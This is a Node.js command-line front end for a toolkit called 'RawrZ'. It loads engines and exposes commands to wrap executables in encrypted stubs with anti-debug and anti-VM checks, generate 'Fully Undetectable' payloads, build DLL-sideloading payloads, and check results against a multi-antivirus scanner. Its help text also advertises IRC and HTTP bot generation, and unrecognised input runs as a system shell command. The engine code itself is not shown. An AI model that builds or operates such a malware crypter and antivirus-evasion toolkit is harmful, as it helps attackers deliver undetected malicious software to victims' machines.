#!/usr/bin/env node

/**
 * RawrZ CLI - Interactive Direct Engine Interface
 * No external dependencies - uses engines directly
 */

const fs = require('fs');
const path = require('path');
const readline = require('readline');

class RawrZCLI {
    constructor() {
        this.engines = {};
        this.rl = null;
        this.interactiveMode = false;
        this.loadEngines();
    }

    loadEngines() {
        const enginesDir = './src/engines';
        const engineFiles = fs.readdirSync(enginesDir).filter(file => file.endsWith('.js'));
        
        console.log('Loading RawrZ Engines...');
        
        engineFiles.forEach(file => {
            try {
                const engineName = file.replace('.js', '');
                const enginePath = path.resolve(enginesDir, file);
                const EngineClass = require(enginePath);
                
                // Handle both class and instance exports
                if (typeof EngineClass === 'function') {
                    this.engines[engineName] = new EngineClass();
                } else {
                    this.engines[engineName] = EngineClass;
                }
                
                console.log(`[OK] ${engineName}: Loaded`);
            } catch (error) {
                console.log(`[ERROR] ${file}: Failed to load - ${error.message}`);
            }
        });
        
        console.log(`\nTotal Engines Loaded: ${Object.keys(this.engines).length}`);
    }

    async listEngines() {
        console.log('\nAvailable RawrZ Engines:');
        console.log('=========================');
        
        for (const [name, engine] of Object.entries(this.engines)) {
            try {
                if (engine.getStatus) {
                    const status = await engine.getStatus();
                    const statusIcon = status.status === 'active' ? '[ACTIVE]' : '[INACTIVE]';
                    console.log(`${statusIcon} ${name}: ${status.status || 'loaded'}`);
                } else {
                    console.log(`[LOADED] ${name}: loaded`);
                }
            } catch (error) {
                console.log(`[ERROR] ${name}: error - ${error.message}`);
            }
        }
    }

    async testEngine(engineName) {
        if (!this.engines[engineName]) {
            console.log(`[ERROR] Engine '${engineName}' not found`);
            return;
        }

        console.log(`\nTesting ${engineName}...`);
        
        try {
            const engine = this.engines[engineName];
            
            // Test initialization
            if (engine.initialize) {
                await engine.initialize();
                console.log(`[OK] ${engineName}: Initialized`);
            }
            
            // Test status
            if (engine.getStatus) {
                const status = await engine.getStatus();
                console.log(`[OK] ${engineName}: Status -`, status);
            }
            
            // Test specific functionality
            if (engineName === 'stub-generator' && engine.generateStub) {
                const result = await engine.generateStub('test_target.exe', {
                    encryptionMethod: 'aes-256-gcm',
                    stubType: 'cpp'
                });
                console.log(`[OK] ${engineName}: Stub generation test passed`);
            }
            
            if (engineName === 'camellia-assembly' && engine.generateStub) {
                const result = engine.generateStub({
                    algorithm: 'camellia-256-cbc',
                    key: Buffer.from('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', 'hex'),
                    iv: Buffer.from('0123456789abcdef0123456789abcdef', 'hex'),
                    format: 'assembly'
                });
                console.log(`[OK] ${engineName}: Assembly stub generation test passed`);
            }
            
            if (engineName === 'dual-crypto-engine' && engine.generateDualStub) {
                const result = engine.generateDualStub({
                    algorithm: 'dual-aes-camellia',
                    keys: {
                        primary: Buffer.from('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef', 'hex'),
                        secondary: Buffer.from('fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210', 'hex')
                    },
                    ivs: {
                        primary: Buffer.from('0123456789abcdef0123456789abcdef', 'hex'),
                        secondary: Buffer.from('fedcba9876543210fedcba9876543210', 'hex')
                    },
                    fileType: 'exe'
                });
                console.log(`[OK] ${engineName}: Dual stub generation test passed`);
            }
            
            console.log(`[SUCCESS] ${engineName}: All tests passed!`);
            
        } catch (error) {
            console.log(`[ERROR] ${engineName}: Test failed - ${error.message}`);
        }
    }

    async generateStub(target, options = {}) {
        console.log(`\nGenerating stub for: ${target}`);
        
        try {
            const stubGenerator = this.engines['stub-generator'];
            if (!stubGenerator) {
                throw new Error('Stub generator not available');
            }
            
            const result = await stubGenerator.generateStub(target, {
                encryptionMethod: 'aes-256-gcm',
                stubType: 'cpp',
                includeAntiDebug: true,
                includeAntiVM: true,
                ...options
            });
            
            console.log('[SUCCESS] Stub generated successfully:');
            console.log(`   ID: ${result.id}`);
            console.log(`   Type: ${result.stubType}`);
            console.log(`   Encryption: ${result.encryptionMethod}`);
            console.log(`   Output: ${result.outputPath}`);
            
            return result;
        } catch (error) {
            console.log(`[ERROR] Stub generation failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    async scanFile(filePath) {
        console.log(`\nScanning file: ${filePath}`);
        
        try {
            const jottiScanner = this.engines['jotti-scanner'];
            if (!jottiScanner) {
                throw new Error('Jotti scanner not available');
            }
            
            const result = await jottiScanner.scanFile(filePath);
            
            if (result.success) {
                console.log('[SUCCESS] Scan completed:');
                console.log(`   File: ${result.filePath}`);
                console.log(`   Size: ${result.fileSize} bytes`);
                console.log(`   Job ID: ${result.jobId}`);
                console.log(`   Summary:`, result.summary);
            } else {
                console.log(`[ERROR] Scan failed: ${result.error}`);
            }
            
            return result;
        } catch (error) {
            console.log(`[ERROR] Scan failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    async encryptFile(filePath, algorithm = 'aes-256-gcm') {
        console.log(`\nEncrypting file: ${filePath} with ${algorithm}`);
        
        try {
            const advancedCrypto = this.engines['advanced-crypto'];
            if (!advancedCrypto) {
                throw new Error('Advanced crypto engine not available');
            }
            
            const result = await advancedCrypto.encrypt(filePath, algorithm);
            
            console.log('[SUCCESS] File encrypted successfully:');
            console.log(`   Algorithm: ${algorithm}`);
            console.log(`   Output: ${result.outputPath || 'encrypted'}`);
            
            return result;
        } catch (error) {
            console.log(`[ERROR] Encryption failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    async decryptFile(filePath, key, iv) {
        console.log(`\nDecrypting file: ${filePath}`);
        
        try {
            const advancedCrypto = this.engines['advanced-crypto'];
            if (!advancedCrypto) {
                throw new Error('Advanced crypto engine not available');
            }
            
            const result = await advancedCrypto.decrypt(filePath, key, iv);
            
            console.log('[SUCCESS] File decrypted successfully:');
            console.log(`   Output: ${result.outputPath || 'decrypted'}`);
            
            return result;
        } catch (error) {
            console.log(`[ERROR] Decryption failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    async generateBeaconism(type) {
        console.log(`\nGenerating beaconism payload: ${type}`);
        
        try {
            const beaconismDLL = this.engines['beaconism-dll-sideloading'];
            if (!beaconismDLL) {
                throw new Error('Beaconism DLL engine not available');
            }
            
            const result = await beaconismDLL.generatePayload({ type });
            
            console.log('[SUCCESS] Beaconism payload generated:');
            console.log(`   Type: ${type}`);
            console.log(`   Output: ${result.outputPath || 'payload'}`);
            
            return result;
        } catch (error) {
            console.log(`[ERROR] Beaconism generation failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    async generateFUD(target, level = 'basic') {
        console.log(`\nGenerating FUD for: ${target} (${level})`);
        
        try {
            const advancedFUDEngine = this.engines['advanced-fud-engine'];
            if (!advancedFUDEngine) {
                throw new Error('Advanced FUD engine not available');
            }
            
            const result = await advancedFUDEngine.applyBasicFUD(target, 'exe', { level });
            
            console.log('[SUCCESS] FUD generated successfully:');
            console.log(`   Target: ${target}`);
            console.log(`   Level: ${level}`);
            console.log(`   Output: ${result.outputPath || 'fud'}`);
            
            return result;
        } catch (error) {
            console.log(`[ERROR] FUD generation failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    async listUploadedFiles() {
        console.log('\nListing uploaded files from panel...');
        
        try {
            const uploadsDir = './uploads';
            const payloadsDir = './uploads/payloads';
            
            // Check if uploads directory exists
            if (!fs.existsSync(uploadsDir)) {
                console.log('[INFO] No uploads directory found. Upload files via panel first.');
                return [];
            }
            
            const files = [];
            
            // List files in main uploads directory
            if (fs.existsSync(uploadsDir)) {
                const mainFiles = fs.readdirSync(uploadsDir, { withFileTypes: true });
                mainFiles.forEach(file => {
                    if (file.isFile()) {
                        files.push({
                            name: file.name,
                            path: `${uploadsDir}/${file.name}`,
                            type: 'upload'
                        });
                    }
                });
            }
            
            // List files in payloads directory
            if (fs.existsSync(payloadsDir)) {
                const payloadFiles = fs.readdirSync(payloadsDir, { withFileTypes: true });
                payloadFiles.forEach(file => {
                    if (file.isFile()) {
                        files.push({
                            name: file.name,
                            path: `${payloadsDir}/${file.name}`,
                            type: 'payload'
                        });
                    }
                });
            }
            
            if (files.length === 0) {
                console.log('[INFO] No uploaded files found. Upload files via panel first.');
                return [];
            }
            
            console.log(`[SUCCESS] Found ${files.length} uploaded files:`);
            files.forEach((file, index) => {
                console.log(`   ${index + 1}. ${file.name} (${file.type}) - ${file.path}`);
            });
            
            return files;
        } catch (error) {
            console.log(`[ERROR] Failed to list uploaded files: ${error.message}`);
            return [];
        }
    }

    async selectUploadedFile() {
        const files = await this.listUploadedFiles();
        
        if (files.length === 0) {
            return null;
        }
        
        if (files.length === 1) {
            console.log(`[INFO] Using only uploaded file: ${files[0].name}`);
            return files[0].path;
        }
        
        // In interactive mode, we could prompt user to select
        // For now, return the first file
        console.log(`[INFO] Using first uploaded file: ${files[0].name}`);
        return files[0].path;
    }

    async processUploadedFile(operation, options = {}) {
        const filePath = await this.selectUploadedFile();
        
        if (!filePath) {
            console.log('[ERROR] No uploaded files available. Upload files via panel first.');
            return;
        }
        
        console.log(`\nProcessing uploaded file: ${filePath}`);
        
        switch (operation) {
            case 'stub':
                return await this.generateStub(filePath, options);
            case 'scan':
                return await this.scanFile(filePath);
            case 'encrypt':
                return await this.encryptFile(filePath, options.algorithm || 'aes-256-gcm');
            case 'fud':
                return await this.generateFUD(filePath, options.level || 'basic');
            case 'beaconism':
                return await this.generateBeaconism(options.type || 'exe');
            default:
                console.log(`[ERROR] Unknown operation: ${operation}`);
        }
    }

    async uploadFromURL(url, filename = null) {
        console.log(`\nDownloading file from URL: ${url}`);
        
        try {
            const https = require('https');
            const http = require('http');
            const urlModule = require('url');
            const path = require('path');
            
            const parsedUrl = urlModule.parse(url);
            const client = parsedUrl.protocol === 'https:' ? https : http;
            
            const downloadPromise = new Promise((resolve, reject) => {
                client.get(url, (response) => {
                    if (response.statusCode !== 200) {
                        reject(new Error(`HTTP ${response.statusCode}`));
                        return;
                    }
                    
                    const chunks = [];
                    response.on('data', chunk => chunks.push(chunk));
                    response.on('end', () => resolve(Buffer.concat(chunks)));
                    response.on('error', reject);
                }).on('error', reject);
            });
            
            const fileContent = await downloadPromise;
            
            // Generate filename if not provided
            if (!filename) {
                filename = path.basename(parsedUrl.pathname) || 'downloaded_file';
            }
            
            // Ensure uploads directory exists
            const uploadsDir = './uploads';
            if (!fs.existsSync(uploadsDir)) {
                fs.mkdirSync(uploadsDir, { recursive: true });
            }
            
            // Save file
            const filePath = path.join(uploadsDir, filename);
            fs.writeFileSync(filePath, fileContent);
            
            console.log('[SUCCESS] File downloaded and saved:');
            console.log(`   URL: ${url}`);
            console.log(`   Filename: ${filename}`);
            console.log(`   Size: ${fileContent.length} bytes`);
            console.log(`   Path: ${filePath}`);
            
            return { success: true, filePath, filename, size: fileContent.length };
        } catch (error) {
            console.log(`[ERROR] URL download failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    async browseLocalFiles(directory = '.') {
        console.log(`\nBrowsing local files in: ${directory}`);
        
        try {
            const path = require('path');
            const fullPath = path.resolve(directory);
            
            if (!fs.existsSync(fullPath)) {
                console.log(`[ERROR] Directory does not exist: ${fullPath}`);
                return [];
            }
            
            const items = fs.readdirSync(fullPath, { withFileTypes: true });
            const files = [];
            const directories = [];
            
            items.forEach(item => {
                if (item.isFile()) {
                    const filePath = path.join(fullPath, item.name);
                    const stats = fs.statSync(filePath);
                    files.push({
                        name: item.name,
                        path: filePath,
                        size: stats.size,
                        modified: stats.mtime,
                        type: 'file'
                    });
                } else if (item.isDirectory()) {
                    directories.push({
                        name: item.name,
                        path: path.join(fullPath, item.name),
                        type: 'directory'
                    });
                }
            });
            
            // Sort files by name
            files.sort((a, b) => a.name.localeCompare(b.name));
            directories.sort((a, b) => a.name.localeCompare(b.name));
            
            console.log(`[SUCCESS] Found ${files.length} files and ${directories.length} directories:`);
            
            // Show directories first
            if (directories.length > 0) {
                console.log('\nDirectories:');
                directories.forEach((dir, index) => {
                    console.log(`   ${index + 1}. [DIR] ${dir.name}`);
                });
            }
            
            // Show files
            if (files.length > 0) {
                console.log('\nFiles:');
                files.forEach((file, index) => {
                    const sizeStr = this.formatFileSize(file.size);
                    const dateStr = file.modified.toLocaleDateString();
                    console.log(`   ${index + 1}. ${file.name} (${sizeStr}) - ${dateStr}`);
                });
            }
            
            return { files, directories, currentPath: fullPath };
        } catch (error) {
            console.log(`[ERROR] Failed to browse directory: ${error.message}`);
            return { files: [], directories: [], currentPath: directory };
        }
    }

    formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    async selectLocalFile(directory = '.') {
        const result = await this.browseLocalFiles(directory);
        
        if (result.files.length === 0) {
            console.log('[INFO] No files found in directory.');
            return null;
        }
        
        if (result.files.length === 1) {
            console.log(`[INFO] Using only file: ${result.files[0].name}`);
            return result.files[0].path;
        }
        
        // In interactive mode, we could prompt user to select
        // For now, return the first file
        console.log(`[INFO] Using first file: ${result.files[0].name}`);
        return result.files[0].path;
    }

    async downloadFile(filePath, outputPath = null) {
        console.log(`\nDownloading file: ${filePath}`);
        
        try {
            if (!fs.existsSync(filePath)) {
                console.log(`[ERROR] File does not exist: ${filePath}`);
                return { success: false, error: 'File not found' };
            }
            
            const path = require('path');
            const stats = fs.statSync(filePath);
            
            if (!outputPath) {
                outputPath = path.basename(filePath);
            }
            
            // Copy file to downloads directory
            const downloadsDir = './downloads';
            if (!fs.existsSync(downloadsDir)) {
                fs.mkdirSync(downloadsDir, { recursive: true });
            }
            
            const finalPath = path.join(downloadsDir, outputPath);
            fs.copyFileSync(filePath, finalPath);
            
            console.log('[SUCCESS] File downloaded:');
            console.log(`   Source: ${filePath}`);
            console.log(`   Destination: ${finalPath}`);
            console.log(`   Size: ${this.formatFileSize(stats.size)}`);
            
            return { success: true, filePath: finalPath, size: stats.size };
        } catch (error) {
            console.log(`[ERROR] Download failed: ${error.message}`);
            return { success: false, error: error.message };
        }
    }

    async processFile(filePath, operation, options = {}) {
        if (!filePath || !fs.existsSync(filePath)) {
            console.log(`[ERROR] File not found: ${filePath}`);
            return;
        }
        
        console.log(`\nProcessing file: ${filePath}`);
        
        switch (operation) {
            case 'stub':
                return await this.generateStub(filePath, options);
            case 'scan':
                return await this.scanFile(filePath);
            case 'encrypt':
                return await this.encryptFile(filePath, options.algorithm || 'aes-256-gcm');
            case 'fud':
                return await this.generateFUD(filePath, options.level || 'basic');
            case 'beaconism':
                return await this.generateBeaconism(options.type || 'exe');
            case 'download':
                return await this.downloadFile(filePath, options.outputPath);
            default:
                console.log(`[ERROR] Unknown operation: ${operation}`);
        }
    }

    async executeSystemCommand(command) {
        const { spawn } = require('child_process');
        const os = require('os');
        
        console.log(`\n[SYSTEM] Executing: ${command}`);
        
        try {
            // Determine shell based on OS
            const isWindows = os.platform() === 'win32';
            const shell = isWindows ? 'cmd.exe' : '/bin/bash';
            const shellArgs = isWindows ? ['/c', command] : ['-c', command];
            
            const child = spawn(shell, shellArgs, {
                stdio: 'inherit',
                shell: true,
                cwd: process.cwd()
            });
            
            child.on('error', (error) => {
                console.log(`[ERROR] Command execution failed: ${error.message}`);
            });
            
            child.on('close', (code) => {
                if (code === 0) {
                    console.log(`[SUCCESS] Command completed successfully`);
                } else {
                    console.log(`[WARNING] Command exited with code: ${code}`);
                }
                console.log(`\nRawrZ@Security:~$ `);
            });
            
        } catch (error) {
            console.log(`[ERROR] Failed to execute system command: ${error.message}`);
            console.log(`[INFO] Try using RawrZ commands: list, test, stub, scan, encrypt, etc.`);
            console.log(`[INFO] Or use 'help' for available commands`);
        }
    }

    showHelp() {
        console.log(`
RawrZ CLI - Direct Engine Interface
===================================

Usage: node rawrz-cli.js <command> [options]

Commands:
  list                    List all available engines
  test <engine>          Test specific engine functionality
  stub <target>          Generate stub for target file
  scan <file>            Scan file with virus scanner
  interactive            Start interactive mode
  help                   Show this help message

Examples:
  node rawrz-cli.js list
  node rawrz-cli.js test stub-generator
  node rawrz-cli.js stub calc.exe
  node rawrz-cli.js scan C:\\Windows\\System32\\calc.exe
  node rawrz-cli.js interactive

Available Engines:
${Object.keys(this.engines).map(name => `  - ` + name).join('\n')}
`);
    }

    setupInteractiveMode() {
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout,
            prompt: 'RawrZ@Security:~$ '
        });

        this.rl.on('line', (input) => {
            this.processInteractiveCommand(input.trim());
            this.rl.prompt();
        });

        this.rl.on('close', () => {
            console.log('\nGoodbye!');
            process.exit(0);
        });

        this.showInteractiveWelcome();
        this.rl.prompt();
    }

    showInteractiveWelcome() {
        console.log(`
RawrZ Security Platform - Interactive CLI
=========================================
Type commands directly or use quick commands below

Available Commands:
  list                    - List all available engines
  test <engine>           - Test specific engine functionality  
  stub <target>           - Generate stub for target file
  scan <file>             - Scan file with virus scanner
  encrypt <file> [algo]   - Encrypt file with advanced crypto
  decrypt <file> [key]    - Decrypt file
  beaconism <type>        - Generate beaconism payload
  fud <target> [level]    - Generate FUD (Fully Undetectable) payload
  irc-bot <config>        - Generate IRC bot
  http-bot <config>       - Generate HTTP bot
  network <cmd> <target>  - Network tools (portscan, traceroute, whois)
  forensics <target>      - Digital forensics analysis
  mobile <target>         - Mobile tools analysis
  cve <cve-id>            - CVE analysis
  backup <action>         - Backup system operations
  openssl <cmd>           - OpenSSL management
  stealth <target>        - Stealth operations
  polymorphic <target>    - Polymorphic operations
  compression <file>      - File compression
  mutex <operation>       - Mutex operations
  performance <action>    - Performance optimization
  files                   - List uploaded files from panel
  process <op> [options]  - Process uploaded files (stub/scan/encrypt/fud/beaconism)
  upload <url> [filename] - Download file from URL to uploads
  browse [dir]            - Browse local files and directories
  select <file>           - Select local file for processing
  download <file> [path]  - Download file to downloads directory
  help                    - Show help message
  clear                   - Clear screen
  exit                    - Exit CLI

System Commands (any command not listed above):
  dir, ls, cd, pwd, mkdir, rmdir, copy, move, del, type, cat, etc.
  All standard Windows/Linux commands work directly!

Examples:
  test stub-generator
  stub calc.exe
  scan C:\\Windows\\System32\\calc.exe
  encrypt secret.txt aes-256-gcm
  beaconism exe
  fud calc.exe advanced
  irc-bot server=irc.example.com
  network portscan 192.168.1.1
  forensics C:\\temp
  cve CVE-2023-1234
  list

Type commands directly or use quick commands below
        `);
    }

    async processInteractiveCommand(input) {
        if (!input) {
            return;
        }

        const parts = input.split(' ');
        const command = parts[0].toLowerCase();
        const param = parts.slice(1).join(' ');

        switch (command) {
            case 'list':
                await this.listEngines();
                break;
            case 'test':
                if (!param) {
                    console.log('[ERROR] Please specify an engine name to test');
                    console.log('Usage: test <engine-name>');
                    return;
                }
                await this.testEngine(param);
                break;
            case 'stub':
                if (!param) {
                    console.log('[ERROR] Please specify a target file');
                    console.log('Usage: stub <target-file>');
                    return;
                }
                await this.generateStub(param);
                break;
            case 'scan':
                if (!param) {
                    console.log('[ERROR] Please specify a file to scan');
                    console.log('Usage: scan <file-path>');
                    return;
                }
                await this.scanFile(param);
                break;
            case 'encrypt':
                if (!param) {
                    console.log('[ERROR] Please specify a file to encrypt');
                    console.log('Usage: encrypt <file-path> [algorithm]');
                    return;
                }
                const encryptParts = param.split(' ');
                const encryptFile = encryptParts[0];
                const encryptAlgo = encryptParts[1] || 'aes-256-gcm';
                await this.encryptFile(encryptFile, encryptAlgo);
                break;
            case 'decrypt':
                if (!param) {
                    console.log('[ERROR] Please specify a file to decrypt');
                    console.log('Usage: decrypt <file-path> [key] [iv]');
                    return;
                }
                const decryptParts = param.split(' ');
                const decryptFile = decryptParts[0];
                const decryptKey = decryptParts[1];
                const decryptIv = decryptParts[2];
                await this.decryptFile(decryptFile, decryptKey, decryptIv);
                break;
            case 'beaconism':
                if (!param) {
                    console.log('[ERROR] Please specify beaconism type');
                    console.log('Usage: beaconism <type>');
                    return;
                }
                await this.generateBeaconism(param);
                break;
            case 'fud':
                if (!param) {
                    console.log('[ERROR] Please specify target for FUD');
                    console.log('Usage: fud <target> [level]');
                    return;
                }
                const fudParts = param.split(' ');
                const fudTarget = fudParts[0];
                const fudLevel = fudParts[1] || 'basic';
                await this.generateFUD(fudTarget, fudLevel);
                break;
            case 'help':
            case '--help':
            case '-h':
                this.showHelp();
                break;
            case 'clear':
                console.clear();
                this.showInteractiveWelcome();
                break;
            case 'files':
                await this.listUploadedFiles();
                break;
            case 'process':
                if (!param) {
                    console.log('[ERROR] Please specify operation: stub, scan, encrypt, fud, beaconism');
                    break;
                }
                const operation = param.split(' ')[0];
                await this.processUploadedFile(operation, {});
                break;
            case 'upload':
                if (!param) {
                    console.log('[ERROR] Please specify URL to download');
                    break;
                }
                const uploadParts = param.split(' ');
                const url = uploadParts[0];
                const filename = uploadParts[1] || null;
                await this.uploadFromURL(url, filename);
                break;
            case 'browse':
                const directory = param || '.';
                await this.browseLocalFiles(directory);
                break;
            case 'select':
                if (!param) {
                    console.log('[ERROR] Please specify file path');
                    break;
                }
                console.log(`[INFO] Selected file: ${param}`);
                break;
            case 'download':
                if (!param) {
                    console.log('[ERROR] Please specify file to download');
                    break;
                }
                const downloadParts = param.split(' ');
                const sourceFile = downloadParts[0];
                const outputPath = downloadParts[1] || null;
                await this.downloadFile(sourceFile, outputPath);
                break;
            case 'exit':
            case 'quit':
                this.rl.close();
                break;
            default:
                // Try to execute as system command
                await this.executeSystemCommand(input);
        }
    }

    async run() {
        const args = process.argv.slice(2);
        
        // Check if interactive mode is requested
        if (args.length === 0 || args[0] === 'interactive' || args[0] === '-i') {
            this.interactiveMode = true;
            this.setupInteractiveMode();
            return;
        }

        // Original command-line mode
        const command = args[0];
        const param = args[1];

        switch (command) {
            case 'list':
                await this.listEngines();
                break;
            case 'test':
                if (!param) {
                    console.log('[ERROR] Please specify an engine name to test');
                    console.log('Usage: node rawrz-cli.js test <engine-name>');
                    return;
                }
                await this.testEngine(param);
                break;
            case 'stub':
                if (!param) {
                    console.log('[ERROR] Please specify a target file');
                    console.log('Usage: node rawrz-cli.js stub <target-file>');
                    return;
                }
                await this.generateStub(param);
                break;
            case 'scan':
                if (!param) {
                    console.log('[ERROR] Please specify a file to scan');
                    console.log('Usage: node rawrz-cli.js scan <file-path>');
                    return;
                }
                await this.scanFile(param);
                break;
            case 'help':
            case '--help':
            case '-h':
                this.showHelp();
                break;
            default:
                console.log('[ERROR] Unknown command. Use "help" for usage information.');
                this.showHelp();
        }
    }
}

// Run CLI if called directly
if (require.main === module) {
    const cli = new RawrZCLI();
    cli.run().catch(console.error);
}

module.exports = RawrZCLI;
